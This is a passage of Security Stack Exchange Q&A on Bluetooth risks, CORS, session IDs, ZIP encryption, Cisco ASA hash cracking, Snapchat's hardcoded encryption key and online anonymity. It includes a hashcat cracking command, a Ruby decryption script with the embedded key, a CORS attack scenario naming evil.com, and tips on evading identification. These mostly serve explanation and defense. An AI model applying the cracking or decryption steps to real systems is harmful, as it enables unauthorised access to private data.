<p>There is a lot written about this topic on this site.  I suggest you read <a href=""https://security.stackexchange.com/q/1525/971"">Is visiting HTTPS websites on a public hotspot secure?</a>.  Also see the blog entry <a href=""http://security.blogoverflow.com/2011/07/qotw-3-does-an-established-ssl-connection-mean-a-line-is-really-secure/"" rel=""noreferrer"">QotW #3: Does an established SSL connection mean a line is really secure?</a>.
And read <a href=""https://security.stackexchange.com/q/9854/971"">Is accessing bank account on the internet really secure?</a> and <a href=""https://security.stackexchange.com/q/5/971"">Does an established ssl connection mean a line is really secure</a>.  Doing a search on this site will find lots of information -- give it a try!</p>
","13634"
"What is the difference between Federated Login and Single Sign On?","77316","","<p>What is the difference between Federated Login and Single Sign On authentication methods?</p>
","<p><a href=""http://en.wikipedia.org/wiki/Single_sign-on"">Single Sign-on (SSO)</a> allows users to access multiple services with a single login. </p>

<p>The term is actually a <em>little</em> ambiguous. Sometimes it's used to mean that (1) the user only has to provide credentials a single time per session, and then gains access to multiple services without having to sign in again during that session. But sometimes it's used to mean (2) merely that the same credentials are used for multiple services; <a href=""http://en.wikipedia.org/wiki/Single_sign-on#Shared_authentication_schemes_which_are_not_single_sign-on"">the user might have to login multiple times, but it's always the same credentials</a>. So beware, all SSO's are not the same in that regard. Many people (me included) only consider the first case to be ""true"" SSO.</p>

<p><a href=""http://en.wikipedia.org/wiki/Federated_identity"">Federated Identity (FID)</a> refers to where the user stores their credentials. Alternatively, FID can be viewed as a way to connect Identity Management systems together. In FID, a user's credentials are always stored with the ""home"" organization (the ""identity provider""). When the user logs into a service, instead of providing credentials to the service provider, the service provider trusts the identity provider to validate the credentials. So the user never provides credentials directly to anybody but the identity provider. </p>

<p>FID and SSO are different, but are very often used together. Most FID systems provide some kind of SSO. And many SSO systems are implemented under-the-hood as FID. But they don't have to be done that way; FID and SSO can be completely separate too.</p>
","13831"
"What can an attacker do with Bluetooth and how should it be mitigated?","77176","","<p>What are the security risks of Bluetooth and what technologies and best practices should be used to protect my device? What can an attacker do once a malicious device is paired with mine?</p>

<p>Specifically </p>

<ul>
<li><p>Is it a good idea to remove &amp; re-pair my devices on a set interval (thinking that this is changing the Bluetooth PIN)</p></li>
<li><p>What is the security impact of making my device or computer ""discoverable""?</p></li>
<li><p>What kind of access does a Bluetooth enabled device get on my system?</p></li>
<li><p>How can I control the scope of access a Bluetooth device has?  (if my phone were compromised I'd want to limit the exposure my PC has)</p></li>
<li><p>Are there Bluetooth security features that may (or may not be enabled)?  How can I audit for the presence (or lack of) these features?</p></li>
<li><p>Assuming encryption is a security feature that can be enabled, is it required or is it optional?  (moreover could an SSL Strip for Bluetooth be created?)</p></li>
</ul>

<p>I'm interested in information that addresses mobile phones (<a href=""http://support.apple.com/kb/ht3647"">iOS</a>), OSX, Windows, and Linux operating systems</p>
","<p><em>(Note: This answer is from 2013. A lot has changed in Bluetooth since then, especially the sharp rise in BLE popularity, new attacks, deprecated features. Having that said, most of it is still applicable.)</em></p>

<h2>Introduction</h2>

<p>I'll try to the best of my knowledge to approach your questions without touching the technical parts of the Bluetooth technology itself. I've learned a lot of the following while I had to write a security report to shape a <a href=""https://en.wikipedia.org/wiki/Bring_your_own_device"">BYOD</a> policy. Knowing you, I won't have to lecture you on that there's nothing 100% secure, everything we do is just to make it harder for the bad guys.</p>

<h2>What Bluetooth is NOT</h2>

<ul>
<li><p>Bluetooth itself as a technology isn't secure, it's not only about the implementation, there are some serious flaws in the design itself.</p></li>
<li><p>Bluetooth isn't a short range communication method - just because you're a bit far doesn't mean you're safe. <a href=""https://web.archive.org/web/20140326211350/http://www.bluetooth.com/Pages/Basics.aspx"">Class I Bluetooth devices</a> have a range up to 100 meters.</p></li>
<li><p>Bluetooth isn't a mature communicate method (security-wise). With smart phones, it has turned into something totally different from what it was meant to be. It was created as a way to connect phones to peripherals. My advice: Don't use Bluetooth for anything serious.</p></li>
</ul>

<h2>How is Bluetooth being secured now?</h2>

<ul>
<li><p>Frequency hopping like crazy: Bluetooth uses something called AFH (Adaptive Frequency Hopping). It basically uses 79 channels in the 2.4 Ghz <a href=""https://en.wikipedia.org/wiki/ISM_band"">ISM band</a> and it keeps hopping between them on a rate of 1600 hops/s, while observing the environment and excluding any existing frequencies from the hopping list. This greatly reduces interference and jamming attempts.</p></li>
<li><p><a href=""https://en.wikipedia.org/wiki/E0_%28cipher%29"">E0 cipher suite</a>: Uses a stream cipher with a 128-bit key.</p></li>
<li><p>Undiscoverability: Unless you set your device to ""discoverable"" it won't respond to scanning attempts and your 48-bit BD_ADDR (the address that identifies your Bluetooth-enabled device) won't be revealed.</p></li>
<li><p>Pairing: Unless the devices are paired with the parties' consent they won't be able to communicate. A pairing request can only be made if you know the other device's BD_ADDR (through scan or previous knowledge).</p></li>
</ul>

<blockquote>
  <p><strong>Is it a good idea to remove &amp; re-pair my devices on a set interval
  (thinking that this is changing the Bluetooth PIN)</strong></p>
</blockquote>

<p>Yes. It's a very good idea. You're eliminating the risks of being exploited by your trusted devices. Given that we usually pair devices for insignificant reasons (sending a file to an acquaintance, getting a VCard from a person you met somewhere..) it's very likely to build a huge list of ""trusted"" devices if you use Bluetooth a lot.</p>

<blockquote>
  <p><strong>What is the security impact of making my device or computer
  ""discoverable""?</strong></p>
</blockquote>

<p>The problem with making your device discoverable is that you're advertising your BD_ADDR to anybody asking for it. The only way to pair with another device is by knowing the BD_ADDR. In a targeted attack, it's gonna take some time to brute-force the 48-bit BD_ADDR.</p>

<p>In the normal case, knowing your BD_ADDR shouldn't be a big problem, but in case there's a vulnerability in your phone or the Bluetooth software on your computer, it's better to be under the radar. Another problem is the impact on privacy; by being discoverable you're letting unpaired (untrusted) parties know when you're around.</p>

<blockquote>
  <p><strong>What kind of access does a Bluetooth enabled device get on my system?</strong></p>
</blockquote>

<p>In the normal case (no vulnerability to allow arbitrary code execution) it all depends on the <a href=""https://en.wikipedia.org/wiki/Bluetooth_profile"">Bluetooth profiles</a> supported by your device. Usually, you can assume that your computer supports all profiles. I'll just list a few:</p>

<ul>
<li>BHIDP (Bluetooth Human Interface Device Profile) will give access to your mouse and keyboard event firing (moving the mouse and sending keyboard keys).</li>
<li>BIP (Basic Imaging Profile) will give access to your camera.</li>
<li>A2DP (Advanced Audio Distribution Profile) will give access to your MIC and to your audio output.</li>
<li>OBEX (OBject EXchange) is what you usually need to worry about. Depending on the implementation, it could give access to your files, phonebook, messages, etc.</li>
</ul>

<blockquote>
  <p><strong>Are there Bluetooth security features that may (or may not be
  enabled)? How can I audit for the presence (or lack of) these
  features?</strong></p>
</blockquote>

<p>Prior to Bluetooth V2.1, when implementing the protocol itself, the developer has the options to use Security Mode #1, which means no security at all. Devices are allowed to communicate without the need of pairing, and encryption isn't used.</p>

<p>Bluetooth V2.1 and newer require encryption.</p>

<p>As a user, there are a few things you can do to make your Bluetooth usage more secure. <strong>(See below)</strong></p>

<blockquote>
  <p><strong>Assuming encryption is a security feature that can be enabled, is it
  required or is it optional?</strong></p>
</blockquote>

<p>As in the previous question, it's implementation-dependeant. Usually encryption is used by default in PC-PC, smartphone-smartphone, and PC-smartphone communication. As of Bluetooth V2.1, encryption is enabled by default. </p>

<blockquote>
  <p><strong>What can an attacker do once a malicious device is paired with mine?</strong></p>
</blockquote>

<p>Basically, anything that your device supports. To demonstrate this, just use an application called <a href=""http://gallery.mobile9.com/f/317828/"">Super Bluetooth Hack</a>, you'll see very scary things including:</p>

<blockquote>
  <p>- Ringing: playing sounds of incoming call, alarm clock.<br />
  - Calls: dialing number, ending a call.<br />
  - Keys, Pressed keys: pressing and watching pressed keys<br />
  - Contacts<br />
  - Reading SMS<br />
  - Silent mode: turning on or off<br />
  - Phone functionality: turning off the network / phone<br />
  - Alarms<br />
  - Clock: change date and time<br />
  - Change network operator<br />
  - Java: start, delete java applications<br />
  - Calendar<br />
  - Memory status<br />
  - Keylock<br /></p>
</blockquote>

<h2>So what's wrong with Bluetooth?</h2>

<ul>
<li><p><strong>Complete trust in the paired device:</strong> A paired device has access to virtually all of the profiles supported by the other device. This includes OBEX and FTP (File Transfer Profile).</p></li>
<li><p><strong>Profiles have too much freedom:</strong> Profiles are allowed to choose whatever security mode they want. You're even able to implement your own version of OBEX without Bluetooth requiring you to use encryption or authentication at all. (Prior to Bluetooth V2.1)</p></li>
<li><p><strong>Weaknesses in E0:</strong> Since 1999, E0 vulnerabilities started to show. It was proven that it's possible to crack E0 with 2<sup>64</sup> rather than the 2<sup>128</sup> previously believed. Year after year, researchers have discovered more vulnerabilities, leading to the 2005 attack by Lu, Meier and Vaudenay. The attack demonstrated the possibility to recover the key with 2<sup>38</sup> operations.</p></li>
<li><p><strong>Pairing is loosely defined:</strong> Devices are allowed to implement their own pairing methods, including a 4-digit PIN which can be cracked in no time.</p></li>
</ul>

<h2>Finally, for good practice guidelines:</h2>

<p>I'll list some of the important <a href=""http://www.nsa.gov/ia/_files/factsheets/I732-016R-07.pdf"">NSA Bluetooth Security Recommendations</a> (I've modified some of them and added some of my own):</p>

<ul>
<li>Enable Bluetooth functionality only when necessary.</li>
<li>Enable Bluetooth discovery only when necessary.</li>
<li>Keep paired devices close together and monitor what's happening on the devices.</li>
<li>Pair devices using a secure long passkey.</li>
<li>Never enter passkeys or PINs when unexpectedly prompted to do so.</li>
<li>Regularly update and patch Bluetooth-enabled devices.</li>
<li>Remove paired devices immediately after use.</li>
</ul>

<p><strong>Update:</strong> An hour ago I was diving in the <a href=""https://www.bluetooth.org/docman/handlers/downloaddoc.ashx?doc_id=229737"">Bluetooth V4.0 specs</a>, and, to my surprise, it appears they're still using E0 for encryption, and there were no good changes to the pairing mechanism. What's even worse is that they're pushing forward the number-comparison pairing mechanism, in which the users are shown a six-digit number on the two devices and asked to verify if they're the same. Which, in my opinion, opens huge doors for social engineering attacks.</p>

<blockquote>
  <p>For pairing scenarios that require user interaction, eavesdropper protection makes a simple six-digit passkey stronger than a 16-digit alphanumeric character random PIN code.</p>
</blockquote>

<p><a href=""https://developer.bluetooth.org/TechnologyOverview/Pages/v4.aspx"">Source</a></p>

<p><strong>Update 2:</strong> It seems like this ""Just Works"" 6-digit PIN is indeed problematic. Mike Ryan has demonstrated an attack on BLE and <a href=""https://github.com/mikeryan/crackle"">released the code as his tool ""crackle""</a> to brute-force the temporary key and decrypt the traffic. </p>
","36207"
"Can my IT department read my Google Hangouts chats while at work?","76199","","<p>Is Google hangouts encrypted? Would my work's IT guys be able see pictures and text I send while on a work computer? Yes I know I shouldn't be sending stuff I don't want them to see while at work, but it wasn't at work. I use hangouts on my phone as well and just realized I use the hangouts Chrome plug-in at work and it was syncing all my conversations.</p>
","<p>You should assume that they can. There are various ways they can do it, but whether they actually do it depends on company's standards and practices. Some of the options:</p>

<ol>
<li>It's possible to install additional root certificates on company's machines
and use that to MITM all the traffic (traffic goes through company's
gateway/proxy anyway, and having friendly root certificate on user's
PC allows to do a full MITM);</li>
<li>It's possible to install ""employee monitoring software"", which is essentially a key logger + process monitor + screen grabber. Some tools have capacity to locally intercept received messages in chats.</li>
<li>It's possible to use remote access/collaboration tools to monitor what's happening on the screen of a particular PC.</li>
</ol>

<p>In short, if you don't have control over the PC you're working on (and with company's workstations you typically don't), you cannot assume it's free from such surveillance implants.</p>

<p>Hope that's not too scary :)</p>
","65771"
"Why is passing the session id as url parameter insecure?","75251","","<p>I recently followed a discussion, where one person was stating that passing the session id as url parameter is insecure and that cookies should be used instead. The other person said the opposite and argued that Paypal, for example, is passing the session id as url parameter because of security reasons.</p>

<p>Is passing the session id as url parameter really insecure? Why are cookies more secure?
What possibilities does an attacker have for both options (cookies and url parameter)?</p>
","<blockquote>
  <p>Is passing the session id as url parameter really insecure?</p>
</blockquote>

<p>While it's not <em>inherently</em> insecure, it can be a problem unless the code is very well-designed.</p>

<p>Let's say I visit my favorite forum.  It logs me in and appends my session ID to the URL in every request.  I find a particularly interesting topic, and copy &amp; paste the URL into an instant message to my friend.</p>

<p>Unless the application has taken steps to ensure that there's <em>some</em> form of validation on the session ID, the friend that clicked that link <em>may</em> inherit my session, and then would be able to do anything I can do, as me.</p>

<p>By storing session identifiers in cookies, you completely eliminate the link sharing problem.</p>

<p>There's a variation on this theme called <a href=""http://en.wikipedia.org/wiki/Session_fixation"">session fixation</a>, which involves an <em>intentional</em> sharing of a session identifier for malicious purposes.  The linked Wikipedia article goes into depth about how this attack works and how it differs from <em>unintentional</em> sharing of the session identifier.</p>

<blockquote>
  <p>Why are cookies more secure?</p>
</blockquote>

<p>Cookies <em>can</em> be more secure here, because they aren't something that normal users can copy &amp; paste, or even view and modify.  They're a much safer default.</p>

<blockquote>
  <p>What possibilities does an attacker have for both options?</p>
</blockquote>

<p><em>Neither</em> of these methods is secure from man-in-the-middle attacks over unencrypted communication.  Browser addons, spyware and other client-side nasties can also spy on both methods of storing session identifiers.</p>

<p>In both cases, server-side validation that the client that claims to own a session ID is best practice.  What this validation is composed of is up for debate.  Keep in mind that users behind corporate proxies may hop between IP addresses between requests, so locking a session to an IP address may accidentally alienate people.  The <a href=""http://en.wikipedia.org/wiki/Session_fixation"">session fixation</a> article mentions a few other helpful alternatives.</p>
","14094"
"Are password-protected ZIP files secure?","73977","","<p>Following my <a href=""https://security.stackexchange.com/a/35817/11996"">answer</a>. If I can list contents of a password-protected ZIP file, check the file types of each stored file and even replace it with another one, without actually knowing the password, then should ZIP files be still treated as secure?</p>

<p>This is completely insecure in terms of social engineering / influence etc.</p>

<p>I can hijack (intercept) someone else's file (password-protected ZIP file) and I can replace one of the files it contains, with my one (fake, virus) without knowing the password. Replaced file will remain unencrypted, not password-protected inside the 
ZIP, but other files won't be modified.</p>

<p>If a victim unpacks a password-protected archive, extracting program will ask for the password only once, not every time per each file. So end user will not see the difference -- whether the program does not ask for a password, because it already knows it (original file) or because the file being extracted doesn't need a password (file modified by me). This way, I can inject something really bad into a password-protected ZIP file, without knowing its password and count on the receiver assuming the file is unmodified.</p>

<p>Am I missing something or is this really wrong? What can we say about the security terms of a solution, if password is <em>not required</em> to introduce <em>any</em> modification in a password-protected file?</p>
","<p>To answer this, there needs to be a better definition of ""secure"" and/or ""safe"".  It's always got to be defined in light of the purpose of the protection and the risk to the system.  There's no one size fits all here, what's ""safe enough"" for one system, may be abysmally weak on another.  And what's ""safe enough"" on another may be cost prohibitive or down right impractical in a different case.</p>

<p>So, taking the typical concerns one by one:</p>

<ul>
<li><p><strong>Confidentiality</strong> - marginal at best.  Confidentiality is usually rated in terms of how long it will take to gain access to the protected material.  I may be able to <em>change</em> the zip file, but as a hacker it'll take me some amount of time either crack the password or brute force it.  Not a lot of time, passwords are one of the weaker protections, and given the way zip files are often shared, social engineering one's way to the password is usually not hard.  </p></li>
<li><p><strong>Integrity</strong> - nope - as the asker points out - it's easy to change the package and make it look legitimate. </p></li>
<li><p><strong>Availability</strong> - generally not applicable to this sort of security control - this usually refers to the risk of making a service unavailable - the data storing/packaging usually doesn't affect availability one way or the other.</p></li>
<li><p><strong>Non repudiation</strong> - nope, no protection - anyone can modify the package, so anyone contributing to it has probable deniability.</p></li>
</ul>

<p>The trick is - how much better do you want to get?  Encrypted email is an option - as a better protection.  Although it poses it's own connectivity concerns.  And there's many better ways to encrypt data - but the better options also involve key distribution challenges that can add time and cost concerns.  </p>

<p>As a quick way to package and share some data that you don't want to make completely public - it's better than nothing, and it's sometimes the only common denominator you can work out.  For anything high-risk, I'd find a better option.</p>
","35842"
"Why is the Access-Control-Allow-Origin header necessary?","73974","","<p>I understand the <a href=""https://stackoverflow.com/questions/24687313/what-exactly-does-the-access-control-allow-credentials-header-do"">purpose of the <code>Access-Control-Allow-Credentials</code> header</a>, but can't see what problem the <code>Access-Control-Allow-Origin</code> header solves.</p>

<p>More precisely, it's easy to see how, if cross-domain AJAX requests <em>with credentials</em> were permitted by default, or if some server were spitting out <code>Access-Control-Allow-Credentials</code> headers on every request, CSRF attacks would be made possible that could not otherwise be performed. The attack method in this scenario would be simple:</p>

<ol>
<li>Lure an unsuspecting user to my malicious page.</li>
<li>JavaScript on my malicious page sends an AJAX request - <em>with</em> cookies - to some page of a target site.</li>
<li>JavaScript on my malicious page parses the response to the AJAX request, and extracts the CSRF token from it.</li>
<li>JavaScript on my malicious page uses any means - either AJAX or a traditional vessel for a CSRF request, like a form POST - to perform actions using the combination of the user's cookies and their stolen CSRF token.</li>
</ol>

<p>However, what I <em>can't</em> see is what purpose is served by not allowing <em>uncredentialed</em> cross-domain AJAX requests without an <code>Access-Control-Allow-Origin</code> header. Suppose I were to create a browser that behaved as though every HTTP response it ever received contained</p>

<pre><code>Access-Control-Allow-Origin: *
</code></pre>

<p>but still required an appropriate <code>Access-Control-Allow-Credentials</code> header before sending cookies with cross-domain AJAX requests.</p>

<p>Since CSRF tokens have to be tied to individual users (i.e. to individual session cookies),  the response to an <em>uncredentialed</em> AJAX request would not expose any CSRF tokens. So what method of attack - if any - would the hypothetical browser described above be exposing its users to?</p>
","<p>If I understand you correctly, you are saying why is the browser blocking access to a resource that can be freely obtained over the internet if cookies are not involved? Well consider this scenario:</p>

<p><code>www.evil.com</code> - contains malicious script code looking to exploit CSRF vulnerabilites.</p>

<p><code>www.privatesite.com</code> - this is your external site, but instead of locking it down using credentials, you have set it up to be cookieless and to only allow access from your home router's static IP.</p>

<p><code>mynas (192.168.1.1)</code> - this is your home server, only accessible on your home wifi network. Since you are the only one that you allow to connect to your home wifi network, this server isn't protected by credentials and allows anonymous, cookieless access.</p>

<p>Both <code>www.privatesite.com</code> and <code>mynas</code> generate tokens in hidden form fields for protection against CSRF - but since you have disabled authentication these tokens are not tied to any user session.</p>

<p>Now if you accidentally visit <code>www.evil.com</code> this domain could be making requests to <code>www.privatesite.com/turn_off_ip_lockdown</code> passing the token obtained by the cross-domain request, or even to <code>mynas/format_drive</code> using the same method.</p>

<p>Unlikely I know, but I guess the standard is written to be as robust as possible and it doesn't make sense to remove <code>Access-Control-Allow-Origin</code> since it does add benefit in scenarios like this.</p>
","44058"
"Chrome is telling me I am receiving a forged certificate for Gmail, is someone trying to hack me?","71923","","<p>I went to log on to <a href=""https://mail.google.com"" rel=""nofollow"">https://mail.google.com</a> this morning and I got the following error. Is someone trying to attack me or is this just a bug?</p>

<p>I'm on a WPA2 encrypted wireless connection using Chrome Canary 22.0.1230.0.
I've tried clearing my browser's private data and restarting Chrome.
Gmail appears to be working in Safari and Firefox, but I haven't tried logging in.</p>

<blockquote>
  <p>Incorrect certificate for host.</p>
  
  <p>The server presented a certificate that doesn't match built-in expectations.<br>
  These expectations are included for certain, high-security websites in order to protect you.<br>
  Error 150 (net::ERR_SSL_PINNED_KEY_NOT_IN_CERT_CHAIN): The server's certificate appears to be a forgery.</p>
</blockquote>
","<p>Try it on a non-Canary build of Chrome. Last I checked, Canary builds aren't even tested before release so you can't come to any any concrete conclusions unless you use one of the release branches.</p>

<p>As for making the same https connection using Firefox and Safari, I think you have disproved covered the vast majority of security failure possibilities. But the error from Chrome is from a feature that Firefox and Safari do not provide. Thus a good final step would be to get the Chrome stable version to answer your question.</p>

<p>Since Canary builds are so volatile, I think that getting a yes or no answer from us to whether it is a bug is unlikely, unless someone else who runs Canary happened to re-create the problem. You need to use one of the release branches of Chrome.</p>

<p>Edit: According to other comments posted on your question (which have since been deleted), it <strong>looks like a temporary Canary problem</strong>, switching off of Canary will most likely fix it, and, if you are on an untrusted WiFi, that would be a safer than ignoring the error.</p>
","18303"
"Cracking CISCO ASA Passwords","71205","","<p>I've got a copy of a <strong>Cisco ASA</strong> config and i want to crack the following example passwords </p>

<p>I've got the following lines in the config</p>

<blockquote>
  <p>ASA Version 8.4(2)</p>
  
  <p>!</p>
  
  <p>hostname ciscoasa</p>
  
  <p><strong>enable password</strong> 8Ry2YjIyt7RRXU24 <strong>encrypted</strong></p>
  
  <p><strong>passwd</strong> 2KFQnbNIdI.2KYOU <strong>encrypted</strong></p>
  
  <p>names</p>
  
  <p>!</p>
</blockquote>

<p>So <strong>I want to try and crack the enable password</strong>, but i don't know what format it is or what tool i can use to brute force it. (Note the hash there is not the real hash, just a random hash i found online like the original)</p>

<p>I already know the password is “cisco” for passwd, but if that was different, how can i go about cracking it?  Are these two passwords the same format/hash type (the first doesn't have any 'punctuation' but that might just be by chance.</p>

<p>I'm familiar with cracking the MD5 passwords, level/type 7 'secrets' etc but not cracking the enable password for IOS devices.</p>

<p><strong>Extra Credit:</strong></p>

<p>There are also the following lines with multiple usernames in it which i assume are the same format as above.</p>

<blockquote>
  <p>!</p>
  
  <p>no threat-detection statistics tcp-intercept</p>
  
  <p>ntp server </p>
  
  <p>webvpn</p>
  
  <p><strong>username</strong> test <strong>password</strong> hmQhTUMT1T5Z4KHC <strong>encrypted privilege 15</strong></p>
  
  <p>!</p>
</blockquote>

<p>I tried adding the 'known' cisco hash into the PIX-MD5 in cain manually, but it didn't work (used a dict with cisco in it). See below:
<img src=""https://i.stack.imgur.com/ZNWuh.png"" alt=""enter image description here""></p>

<p>Hope someone can help,
Thanks!</p>
","<p>The Cisco ASA config you have provided appears to use CISCO PIX-MD5 hashes.</p>

<p>Both the VPN settings mentioned above and the enable/passwd are not salted, contrary to what the <a href=""http://hashcat.net/forum/thread-1664.html"" rel=""nofollow"">hashcat.net thread</a> suggests in Peleus's post.
It is worth while checking this site: <a href=""http://www.nitrxgen.net/hashgen/"" rel=""nofollow"">Nitrix Hash Generator</a>
In there you can enter 'cisco' as the password and you'll recieve the common </p>

<blockquote>
  <p>2KFQnbNI­dI.2KYOU</p>
</blockquote>

<p>hash back out as you have in the above config. You can repeat the process for blank</p>

<p>If you've used <a href=""http://hashcat.net/oclhashcat-plus/"" rel=""nofollow"">oclHashcat-plus</a> before, the following command worked perfectly to crack it on windows for me.</p>

<blockquote>
  <p>cudaHashcat-plus64.exe --hash-type 2400 C:\Users\user\Desktop\hashes.txt C:\Users\user\Desktop\password.lst </p>
</blockquote>

<p>On my machine i got about 70,000k/s with GPU acceleration. 
I always recommend using a good word-list like this: <a href=""http://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm"" rel=""nofollow"">crackstation's list</a></p>
","31673"
"Why can we still crack snapchat photos in 12 lines of Ruby?","70831","","<p>Just came across this bit of ruby that can be used to decrypt snapchat photos taken out of the cache on a phone, apparently adapted from <a href=""https://gist.github.com/jamescmartinez/6913761"">here</a>. To my surprise, it worked no problem, considering the problems around snapchat's security which have been well publicized lately (Mostly the stuff around the whole phone number/username leak as far as I recall).</p>

<pre><code>require 'openssl'

ARGV.each do|a, index|
    data = File.open(a, 'r:ASCII-8BIT').read
    c = OpenSSL::Cipher.new('AES-128-ECB')
    c.decrypt
    c.key = 'M02cnQ51Ji97vwT4'
    o = ''.force_encoding('ASCII-8BIT')
    data.bytes.each_slice(16) { |s| o += c.update(s.map(&amp;:chr).join) }
    o += c.final
    File.open('decyphered_' + a , 'w') { |f| f.write(o) }
end
</code></pre>

<p>So, my question is, what exactly are they doing wrong here, and what could they be doing better in order to improve the security of their application in this regard rather than what they're doing now, considering that people often send intimate things that were never meant to be shared for longer than 10 seconds only to one person, and also considering the popularity of this app?</p>

<p><strong>tldr/for all those who dont really care to know how computers work but still want to know what is up:</strong> Basically, let's say you have <a href=""http://www.businessinsider.com/snapchat-active-users-exceed-30-million-2013-12"">40 million people</a> who use snapchat, with 16.5 million users sending each other pictures, and each picture in its own tiny locked safe every day. Now, what if you gave those 16.5 million people all the same flimsy, plastic key to open each and every one of these lockboxes to capture the snapchat media?</p>
","<p>This is a serious problem in password-management. The first problem here is the way they managed his key in their source code. SnapChat states that they send the photos encrypted over internet, and it is true after all, but they are using a ""pre-shared"" key to encrypt this data (<a href=""http://legacy.kingston.com/secure/image_files/Figure2_ECB.jpg"" rel=""nofollow noreferrer"">badly using also AES in ECB mode</a>) so, every user around the planet has the key to decipher each photo. </p>

<p>The problem here is, how did internet get the key? Piece of cake, they just included it in every app, and <a href=""http://gibsonsec.org/snapchat/snapchat_gibsonsec.txt"" rel=""nofollow noreferrer"">somebody just searched for it</a>. </p>

<blockquote>
  <p>What is this magic encryption key used by any and all Snapchat app?        </p>
  
  <p>M02cnQ51Ji97vwT4                                                          </p>
  
  <p>You can find this (in the Android app) in a constant string located<br>
  in com.snapchat.android.util.AESEncrypt; no digging required, it is<br>
  quite literally sitting around waiting to be found by anyone.              </p>
  
  <p>On a more positive note (perhaps), in the 3.0.4 (18/08/2013) build<br>
  of the Android app, there is - oddly enough - a second key!                </p>
  
  <p>1234567891123456                                                          </p>
</blockquote>

<p>It is a very bad practice to hardcode a password in your source (no matter if it is in your headers or in your binaries), the main problem being anyone could find it with a simple ""strings"" command into your binary (<a href=""http://www.leakedin.com/"" rel=""nofollow noreferrer"">or by looking in someplace you used to share your code with your friends</a>):</p>

<pre><code>strings binaryFile
</code></pre>

<p>Then the malicious user can have a look to each string and check if that is the password he is looking for. So, if your really need to hardcode a password in your code you better hide it, but this will just be ""<a href=""https://security.stackexchange.com/questions/24449/how-valuable-is-secrecy-of-an-algorithm"">security through obscurity</a>"" and the malicious user will end up finding the key (so you better think in a different approach). </p>

<p>What can they do to improve their security? Well they could have generated a key for each photo, or they can pre-share a key between the clients that are going to share a picture, public/private keys; there are plenty of options.</p>
","52587"
"Router admin password was changed, how did this happen and how to prevent","70570","","<p>Internet was extremely spotty for about a week. I was on/off cycling the cable model and router almost daily, before I tried to sign into my router (198.162.1.1). When I did I was presented with a message ""level_15"" access code required or something similar. I hard reset the router and set everything back up with the same passwords I had used before and it was immediately changed again. After another reset, firmware upgrade, and a strong password chosen for the admin, everything is back to normal.</p>

<p>My questions are:</p>

<ol>
<li>Is this a common hack and why would someone want to do this?</li>
<li>I thought someone would have to been physically close enough to wirelessly access my router. Is it possible to do these things remotely now?</li>
<li>How was the password changed so quickly after the 1st reset?</li>
</ol>

<p><strong>Edit:</strong></p>

<p>I was trying to access my router at <code>http://198.162.1.1/</code>, instead of <code>http://192.168.1.1/</code>.</p>

<p>My router password was likely never changed, I was just using the wrong address. Now, I'm very curious what this ""level_15_access"" is at <code>http://198.162.1.1/.</code></p>
","<p>Seeing that you've erroneously typed 198.162.1.1 instead of 192.168.1.1, the <code>level_15_access</code> login window is no surprise. 
<a href=""http://whois.domaintools.com/198.162.1.1"">198.162.1.1</a> belongs to a Canadian college, and the 198 address is a login screen for something of theirs.</p>
","25192"
"Should SSL be terminated at a load balancer?","70426","","<p>When hosting a cluster of web application servers it’s common to have a reverse proxy (HAProxy, Nginx, F5, etc.) in between the cluster and the public internet to load balance traffic among app servers.  In order to perform deep packet inspection, SSL must be terminated at the load balancer (or earlier), but traffic between the load balancer and the app servers would be unencrypted.  Wouldn't early termination of SSL leave the app servers vulnerable to packet sniffing or ARP poisoning?</p>

<p>Should SSL be offloaded? If so, how can it be done without compromising the integrity of the data being served? My main concern is for a web application where message layer encryption isn't an option.</p>
","<p>It seems to me the question is ""do you trust your own datacenter"".  In other words, it seems like you're trying to finely draw the line where the <em>untrusted</em> networks lie, and the <em>trust</em> begins.  </p>

<p>In my opinion, SSL/TLS trust should terminate at the SSL offloading device since the department that manages that device often also manages the networking and infrastructure.  There is a certain amount of contractual trust there.  There is no point of encrypting data at a downstream server since the same people who are supporting the network usually have access to this as well.  (with the possible exception in multi-tenant environments, or unique business requirements that require deeper segmentation).  </p>

<p>A second reason SSL should terminate at the load balancer is because it offers a centralized place to correct SSL attacks such as <a href=""https://security.stackexchange.com/q/19911/396"">CRIME</a> or <a href=""https://security.stackexchange.com/q/17080/396"">BEAST</a>.  If SSL is terminated at a variety of web servers, running on different OS's you're more likely to run into problems due to the <a href=""https://security.stackexchange.com/q/25126/396"">additional </a> <a href=""https://security.stackexchange.com/q/15350/396"">complexity </a>.  Keep it simple, and you'll have fewer problems in the long run.</p>

<p>That being said</p>

<ol>
<li>Yes, terminate at the load balancer and SSL offload there. Keep it simple.</li>
<li>The Citrix Netscaler load balancer (for example) can deny insecure access to a URL.  This policy logic, combined with the features of TLS should ensure your data remains confidential and tamper-free (given that I properly understand your requirement of integrity) </li>
</ol>

<p><strong>Edit:</strong></p>

<p>It's possible (and common) to </p>

<ul>
<li>Outsource the load balancer (Amazon, Microsoft, etc)</li>
<li>Use a 3rd party CDN (Akamai, Amazon, Microsoft, etc)</li>
<li>Or use a 3rd party proxy to prevent DoS attacks</li>
</ul>

<p>... where traffic from that 3rd party would be sent to your servers over network links you don't manage.  Therefore may not trust those unencrypted links.  In that case you should re-encrypt the data, or at the very least have all of that data travel through a point-point VPN.</p>

<p>Microsoft does offer such a VPN product and allows for secure outsourcing of the perimeter.</p>
","30413"
"How to remain 100% anonymous on the internet?","70329","","<p>I was searching for methods or tools to remain completely anonymous on the Internet. TOR came up, but it is seems that it is far from perfect. Are there any 100% foolproof ways, or approximately 100% foolproof ways? I suspect that 100% may be possible. How else do some cyber criminals behind big crimes never get caught? </p>

<p>This is what I've read about TOR so far: <br>
<a href=""http://en.wikipedia.org/wiki/Tor_%28anonymity_network%29#Weaknesses"">TOR Weaknesses (Wikipedia)</a> <br>
<a href=""http://www.extremetech.com/computing/101633-how-to-use-tor-and-is-it-actually-safe-and-anonymous"">Is TOR actually anonymous, and how to use it</a></p>

<p>My main goal is to prevent detection of my IP.</p>
","<ol>
<li>There is a geeky possibility to use a prepaid card (SIM) and connect
it with a mobile HSDPA dongle i.e <a href=""http://en.wikipedia.org/wiki/Huawei_E220"">Huawei_E220</a> and also you can check the section <strong>Privacy rights and prepaid mobile phones</strong> for <a href=""http://en.wikipedia.org/wiki/Prepaid_mobile_phone"">Prepaid Mobile Phone</a>. If you buy everything without registering you can have access to the world wide web anonymously. Because this is a known problem against cyber crime and other criminal activities it is not allowed in some countries to use such an unregistered prepaid card.</li>
<li>Another possibility is to use an open WI-Fi. For example in an
